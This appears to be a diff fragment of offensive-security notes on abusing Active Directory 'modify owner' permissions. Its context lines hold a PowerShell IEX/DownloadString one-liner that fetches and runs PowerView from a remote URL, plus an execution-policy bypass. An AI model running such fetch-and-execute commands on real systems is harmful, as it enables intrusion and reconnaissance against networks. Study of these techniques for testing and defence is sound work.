@@ -82,7 +82,8 @@ with ✔ Modify permissions
 ### with permissions - ✔ modify owner is only enabled
 
 >IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
-. or downloade the script and run by import
+
+or downloade the script and run by import
 
 >powershell -ep bypass
 >Import-Module .\powerview.ps1
